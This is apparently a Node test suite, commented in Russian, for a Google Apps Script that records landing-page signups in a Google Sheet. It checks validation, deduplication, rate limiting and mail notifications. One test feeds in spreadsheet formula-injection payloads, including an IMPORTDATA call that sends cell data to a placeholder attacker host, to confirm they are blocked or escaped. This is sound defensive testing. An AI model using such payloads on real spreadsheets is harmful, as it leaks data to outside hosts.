/**
 * Проверка Code.gs без Google: скрипт запускается в песочнице Node, а таблица, кэш, замок и почта подменены.
 * Запуск: node --test integrations/google-sheets/Code.test.mjs   (Node 20+)
 *
 * Что именно в таблице покажет Google (формат ячеек, поведение формул), так не проверить:
 * это делается тестовой заявкой по README.md.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import vm from 'node:vm';
import fs from 'node:fs';

const SOURCE = fs.readFileSync(new URL('./Code.gs', import.meta.url), 'utf8');

function createEnv(options = {}) {
  const log = { mails: [], errors: [], formats: [], validations: 0, insertedRows: 0 };
  let maxRows = options.maxRows ?? 1000;

  function makeSheet(name) {
    const data = [];
    const sheet = {
      name,
      data,
      getName: () => sheet.name,
      setName: (n) => { sheet.name = n; return sheet; },
      getLastRow: () => data.reduce((last, row, i) => (row && row.some((v) => v !== '' && v !== null) ? i + 1 : last), 0),
      getMaxRows: () => maxRows,
      insertRowsAfter: (_after, n) => { maxRows += n; log.insertedRows += n; },
      setFrozenRows: () => sheet,
      setColumnWidth: () => sheet,
      getRange: (row, col, numRows = 1, numCols = 1) => {
        const range = {
          row, col, numRows, numCols,
          getValues: () => Array.from({ length: numRows }, (_, i) => Array.from({ length: numCols }, (_, j) => (data[row - 1 + i] || [])[col - 1 + j] ?? '')),
          setValues: (values) => {
            if (row - 1 + values.length > maxRows) throw new Error('The coordinates of the range are outside the dimensions of the sheet.');
            values.forEach((vals, i) => {
              data[row - 1 + i] = data[row - 1 + i] || [];
              vals.forEach((v, j) => { data[row - 1 + i][col - 1 + j] = v; });
            });
            return range;
          },
          setNumberFormats: (formats) => { log.formats.push({ row, formats }); return range; },
        };
        for (const m of ['setNumberFormat', 'setFontWeight', 'setFontColor', 'setBackground', 'setVerticalAlignment', 'setDataValidation']) {
          range[m] = () => { if (m === 'setDataValidation') log.validations++; return range; };
        }
        return range;
      },
    };
    return sheet;
  }

  const sheets = [makeSheet(options.initialSheetName ?? 'Лист1')];
  const spreadsheet = {
    getSheets: () => sheets,
    getSheetByName: (n) => sheets.find((s) => s.name === n) || null,
    insertSheet: (n) => { const s = makeSheet(n); sheets.push(s); return s; },
    getUrl: () => 'https://docs.google.com/spreadsheets/d/TEST/edit',
  };

  const cacheStore = new Map();
  const sandbox = {
    console: { log() {}, error: (m) => log.errors.push(String(m)) },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => (options.unbound ? null : spreadsheet),
      openById: () => spreadsheet,
      newDataValidation: () => ({ requireValueInList() { return this; }, setAllowInvalid() { return this; }, build: () => ({}) }),
    },
    LockService: { getScriptLock: () => ({ tryLock: () => !options.lockFails, releaseLock() {} }) },
    CacheService: { getScriptCache: () => ({ get: (k) => cacheStore.get(k) ?? null, put: (k, v) => { cacheStore.set(k, v); } }) },
    ContentService: {
      MimeType: { JSON: 'application/json' },
      createTextOutput: (text) => ({ getContent: () => text, setMimeType() { return this; } }),
    },
    MailApp: { sendEmail: (m) => { if (options.mailFails) throw new Error('mail quota'); log.mails.push(m); } },
    Utilities: { formatDate: (d) => d.toISOString() },
  };
  const ctx = vm.createContext(sandbox);
  vm.runInContext(SOURCE, ctx, { filename: 'Code.gs' });
  vm.runInContext('Date.now = () => 1760000000000', ctx); // фиксированное окно лимита заявок

  const post = (payload) => {
    const contents = typeof payload === 'string' ? payload : JSON.stringify(payload);
    return JSON.parse(ctx.doPost({ postData: { type: 'text/plain', contents } }).getContent());
  };
  const leadSheet = () => spreadsheet.getSheetByName('Заявки');
  const rows = () => (leadSheet() ? leadSheet().data.slice(1).filter(Boolean) : []);
  return { ctx, post, log, rows, leadSheet, sheets, spreadsheet };
}

const lead = (extra = {}) => ({
  id: 'id-' + Math.random().toString(36).slice(2),
  name: 'Дмитрий Соколов',
  company: 'Студия «Блик»',
  business: 'Детейлинг',
  contact: '@dmitry_s',
  locations: 2,
  consent: true,
  source: 'landing',
  utm: 'vk / post / beta',
  referrer: 'vk.com',
  ...extra,
});

test('заявка попадает в лист «Заявки» с заголовками и в нужном порядке столбцов', () => {
  const env = createEnv();
  assert.deepEqual(env.post(lead()), { ok: true });

  const sheet = env.leadSheet();
  assert.ok(sheet, 'лист «Заявки» создан');
  assert.equal(sheet.data[0][0], 'Дата');
  assert.equal(sheet.data[0][4], 'Telegram или email');
  assert.equal(sheet.data[0].length, 10);

  const [row] = env.rows();
  assert.equal(Object.prototype.toString.call(row[0]), '[object Date]', 'дата хранится датой'); // Date из песочницы: instanceof не годится
  assert.deepEqual(row.slice(1), ['Дмитрий Соколов', 'Студия «Блик»', 'Детейлинг', '@dmitry_s', 2, 'vk / post / beta', 'Да', 'Новая', '']);
  assert.equal(env.log.validations, 1, 'список статусов настроен');
});

test('пустой «Лист1» переименовывается, а лист с данными остаётся нетронутым', () => {
  const empty = createEnv();
  empty.post(lead());
  assert.equal(empty.sheets.length, 1);
  assert.equal(empty.sheets[0].name, 'Заявки');

  const busy = createEnv();
  busy.sheets[0].data[0] = ['чужие данные'];
  busy.post(lead());
  assert.equal(busy.sheets.length, 2);
  assert.equal(busy.sheets[0].data[0][0], 'чужие данные');
});

test('источник: utm важнее реферера, без них «прямой заход»', () => {
  const env = createEnv();
  env.post(lead({ id: 'a', utm: '' }));
  env.post(lead({ id: 'b', utm: '', referrer: '', contact: '@second_one' }));
  const sources = env.rows().map((r) => r[6]);
  assert.deepEqual(sources, ['vk.com', 'прямой заход']);
});

test('необязательные «Точек» можно не указывать, но 0, 1000 и дробь отклоняются', () => {
  const env = createEnv();
  assert.equal(env.post(lead({ locations: null })).ok, true);
  assert.equal(env.rows()[0][5], '');
  for (const bad of [0, 1000, 1.5, 'abc']) {
    assert.deepEqual(env.post(lead({ locations: bad })), { ok: false, error: 'invalid', field: 'locations', reason: 'range' }, 'locations=' + bad);
  }
  assert.equal(env.rows().length, 1);
});

test('без обязательного поля или без согласия заявка не пишется, ответ называет поле', () => {
  const env = createEnv();
  const cases = [
    [{ name: '' }, 'name', 'empty'], [{ company: '  ' }, 'company', 'empty'], [{ business: '' }, 'business', 'unknown'],
    [{ contact: '' }, 'contact', 'empty'], [{ consent: false }, 'consent', 'required'], [{ consent: undefined }, 'consent', 'required'],
  ];
  for (const [patch, field, reason] of cases) {
    assert.deepEqual(env.post(lead(patch)), { ok: false, error: 'invalid', field, reason }, JSON.stringify(patch));
  }
  assert.equal(env.rows().length, 0);
});

test('контакт: телефон не принимается, принимаются Telegram и email в едином виде', () => {
  const env = createEnv();
  for (const phone of ['+7 900 000-00-00', '8 (900) 123-45-67', '89001234567']) {
    assert.deepEqual(env.post(lead({ contact: phone })), { ok: false, error: 'invalid', field: 'contact', reason: 'phone' }, phone);
  }
  assert.equal(env.post(lead({ id: '1', contact: 'https://t.me/Dmitry_S' })).ok, true);
  assert.equal(env.post(lead({ id: '2', contact: 'Ivan.Petrov@Mail.RU' })).ok, true);
  assert.deepEqual(env.rows().map((r) => r[4]), ['@Dmitry_S', 'ivan.petrov@mail.ru']);
});

test('белиберда в имени и названии компании отклоняется, настоящие значения проходят', () => {
  const env = createEnv();
  for (const [patch, field, reason] of [
    [{ name: 'asdfgh' }, 'name', 'gibberish'], [{ name: 'Иван123' }, 'name', 'chars'], [{ name: 'а' }, 'name', 'short'],
    [{ company: 'йцукен' }, 'company', 'gibberish'], [{ company: 'http://spam.ru' }, 'company', 'chars'],
    [{ company: '=1+1' }, 'company', 'chars'], [{ company: 'я'.repeat(101) }, 'company', 'long'],
  ]) {
    assert.deepEqual(env.post(lead(patch)), { ok: false, error: 'invalid', field, reason }, JSON.stringify(patch).slice(0, 60));
  }
  assert.equal(env.rows().length, 0);
  assert.equal(env.post(lead({ name: 'Анна-Мария Петрова', company: 'ООО «Автосервис 24»' })).ok, true);
});

test('вид бизнеса принимается только из списка формы', () => {
  const env = createEnv();
  assert.deepEqual(env.post(lead({ business: 'Космические перевозки' })), { ok: false, error: 'invalid', field: 'business', reason: 'unknown' });
  for (const ok of ['Автосервис', 'Детейлинг', 'Салон красоты', 'Другое']) assert.equal(env.post(lead({ id: ok, business: ok, contact: '@user_' + ok.length + 'xyz' })).ok, true);
});

test('мусорное тело запроса отвергается, а не роняет скрипт', () => {
  const env = createEnv();
  assert.deepEqual(env.post('это не json'), { ok: false, error: 'bad_request' });
  assert.deepEqual(env.post('null'), { ok: false, error: 'bad_request' });
  assert.deepEqual(JSON.parse(env.ctx.doPost({}).getContent()), { ok: false, error: 'bad_request' });
  assert.equal(env.rows().length, 0);
});

test('обычная форма (application/x-www-form-urlencoded) тоже принимается', () => {
  const env = createEnv();
  const parameter = { name: 'Анна', company: 'Салон', business: 'Салон красоты', contact: 'anna@salon.ru', consent: 'on' };
  const out = JSON.parse(env.ctx.doPost({ postData: { type: 'application/x-www-form-urlencoded', contents: 'name=...' }, parameter }).getContent());
  assert.deepEqual(out, { ok: true });
  assert.equal(env.rows()[0][4], 'anna@salon.ru');
});

test('поле-ловушка: бот получает «ок», но строки в таблице нет', () => {
  const env = createEnv();
  assert.deepEqual(env.post(lead({ website: 'http://spam.example' })), { ok: true });
  assert.equal(env.leadSheet(), null);
});

test('повторная отправка той же заявки (тот же id) не дублирует строку', () => {
  const env = createEnv();
  const payload = lead({ id: 'same-id' });
  assert.deepEqual(env.post(payload), { ok: true });
  assert.deepEqual(env.post(payload), { ok: true, duplicate: true });
  assert.equal(env.rows().length, 1);
});

test('тот же контакт в другой записи помечается «Повтор», но строка сохраняется', () => {
  const env = createEnv();
  env.post(lead({ id: '1', contact: '@Dmitry_S' }));
  env.post(lead({ id: '2', contact: 't.me/dmitry_s' }));
  env.post(lead({ id: '3', contact: 'Ivan@Mail.ru' }));
  env.post(lead({ id: '4', contact: 'ivan@mail.ru' }));
  env.post(lead({ id: '5', contact: '@other_person' }));
  assert.deepEqual(env.rows().map((r) => r[8]), ['Новая', 'Повтор', 'Новая', 'Повтор', 'Новая']);
});

test('старые строки с телефоном не мешают: проверка повтора их читает и не падает', () => {
  const env = createEnv();
  env.sheets[0].name = 'Заявки';
  env.sheets[0].data[0] = ['Дата', 'Имя', 'Компания', 'Чем занимается', 'Контакт', 'Точек', 'Источник', 'Согласие', 'Статус', 'Заметки'];
  env.sheets[0].data[1] = [new Date(), 'Старый', 'Клиент', 'Другое', '+7 900 000-00-00', 1, 'landing', 'Да', 'Новая', ''];
  assert.deepEqual(env.post(lead({ contact: '@dmitry_s' })), { ok: true });
  assert.equal(env.rows().at(-1)[8], 'Новая');
});

test('формулы: в имя и компанию «=» не пускается, а в источник из рекламной метки попадает с апострофом', () => {
  const env = createEnv();
  assert.equal(env.post(lead({ name: '=IMPORTDATA("http://evil.example/?"&A2)' })).ok, false);
  assert.equal(env.post(lead({ company: '=1+1' })).ok, false);
  assert.equal(env.post(lead({ utm: '=HYPERLINK("http://evil.example")' })).ok, true);
  const [row] = env.rows();
  assert.equal(row[6], `'=HYPERLINK("http://evil.example")`);
  assert.ok(env.log.formats.every((f) => f.formats[0].slice(1).every((x, i) => (i === 4 ? x === '0' : x === '@'))), 'текстовые форматы заданы до записи');
});

test('переводы строк и управляющие символы вычищаются', () => {
  const env = createEnv();
  env.post(lead({ name: 'Иван\n\tПетров\u0000', company: '  Студия\n  «Блик»  ' }));
  const [row] = env.rows();
  assert.equal(row[1], 'Иван Петров');
  assert.equal(row[2], 'Студия «Блик»');
});

test('письмо уходит только при заданном NOTIFY_EMAIL и не ломает запись при сбое почты', () => {
  const quiet = createEnv();
  quiet.post(lead());
  assert.equal(quiet.log.mails.length, 0);

  const loud = createEnv();
  vm.runInContext("CONFIG.NOTIFY_EMAIL = 'owner@example.com'", loud.ctx);
  loud.post(lead({ contact: '@dmitry_s' }));
  assert.equal(loud.log.mails.length, 1);
  assert.equal(loud.log.mails[0].to, 'owner@example.com');
  assert.match(loud.log.mails[0].subject, /Студия «Блик»/);
  assert.match(loud.log.mails[0].body, /Контакт: @dmitry_s/);
  assert.match(loud.log.mails[0].body, /spreadsheets\/d\/TEST/);

  const broken = createEnv({ mailFails: true });
  vm.runInContext("CONFIG.NOTIFY_EMAIL = 'owner@example.com'", broken.ctx);
  assert.deepEqual(broken.post(lead()), { ok: true });
  assert.equal(broken.rows().length, 1);
  assert.ok(broken.log.errors.some((e) => e.includes('notify')));
});

test('лимит заявок за окно: лишние отклоняются, чтобы мусор не заполнил таблицу', () => {
  const env = createEnv();
  vm.runInContext('CONFIG.RATE_LIMIT = 3', env.ctx);
  const results = [1, 2, 3, 4, 5].map((i) => env.post(lead({ id: 'r' + i, contact: '@user_' + i + '_name' })));
  assert.deepEqual(results.map((r) => r.ok), [true, true, true, false, false]);
  assert.equal(results[3].error, 'rate');
  assert.equal(env.rows().length, 3);
});

test('замок занят: отвечаем «busy» и ничего не пишем', () => {
  const env = createEnv({ lockFails: true });
  assert.deepEqual(env.post(lead()), { ok: false, error: 'busy' });
  assert.equal(env.leadSheet(), null);
});

test('когда строки в листе кончаются, добавляются новые', () => {
  const env = createEnv({ maxRows: 3 });
  env.post(lead({ id: 'a', contact: '@first_user' }));
  env.post(lead({ id: 'b', contact: '@second_user' }));
  assert.deepEqual(env.post(lead({ id: 'c', contact: '@third_user' })), { ok: true });
  assert.ok(env.log.insertedRows > 0);
  assert.equal(env.rows().length, 3);
});

test('скрипт не привязан к таблице: ответ «server», а не падение', () => {
  const env = createEnv({ unbound: true });
  assert.deepEqual(env.post(lead()), { ok: false, error: 'server' });
  assert.ok(env.log.errors.some((e) => e.includes('не привязан')));
});

test('doGet отвечает статусом и не отдаёт данных', () => {
  const env = createEnv();
  env.post(lead());
  const out = JSON.parse(env.ctx.doGet().getContent());
  assert.deepEqual(out, { ok: true, service: 'lidradar-beta-signups' });
});

test('sendTestLead добавляет тестовую заявку', () => {
  const env = createEnv();
  env.ctx.sendTestLead();
  assert.equal(env.rows().length, 1);
  assert.equal(env.rows()[0][1], 'Тест Тестов');
});
